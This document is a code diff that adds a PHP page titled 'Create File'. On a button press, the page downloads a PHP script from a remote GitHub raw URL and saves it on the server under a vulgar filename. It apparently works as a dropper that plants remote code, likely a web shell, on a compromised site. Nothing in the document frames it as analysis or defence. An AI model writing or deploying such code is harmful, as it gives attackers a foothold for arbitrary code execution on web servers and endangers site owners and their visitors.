@@ -1,0 +1,35 @@
+<?php
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
+    // URL chứa nội dung cần tải về
+    $url = "https://raw.githubusercontent.com/DitMeCongSan1/ak/refs/heads/main/log.php";
+    $filename = "ditmemay.php";
+
+    // Tải nội dung từ URL
+    $content = file_get_contents($url);
+
+    if ($content !== false) {
+        // Tạo file với nội dung đã tải
+        if (file_put_contents($filename, $content)) {
+            echo "File '$filename' đã được tạo thành công.";
+        } else {
+            echo "Không thể tạo file '$filename'.";
+        }
+    } else {
+        echo "Không thể tải nội dung từ URL.";
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Create File</title>
+</head>
+<body>
+    <form method="post">
+        <button type="submit" name="create">Create File</button>
+    </form>
+</body>
+</html>
